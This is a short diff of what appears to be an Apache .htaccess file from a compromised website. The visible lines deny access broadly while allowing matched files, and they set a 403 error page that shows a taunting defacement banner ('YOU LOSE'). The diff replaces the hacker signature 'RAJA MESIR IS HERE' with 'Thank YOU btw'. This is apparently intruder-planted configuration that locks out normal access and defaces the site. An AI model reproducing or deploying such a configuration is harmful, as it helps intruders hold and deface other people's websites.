@@ -67,4 +67,4 @@ Deny from all
  Allow from all
 </FilesMatch>
 
-ErrorDocument 403 '<center><img src="https://i.pinimg.com/originals/86/f5/af/86f5af98802bf296333361816ff3c214.gif"></img> <h3>YOU LOSE</font><br><h2>RAJA MESIR IS HERE</h2>'
+ErrorDocument 403 '<center><img src="https://i.pinimg.com/originals/86/f5/af/86f5af98802bf296333361816ff3c214.gif"></img> <h3>YOU LOSE</font><br><h2>Thank YOU btw</h2>'
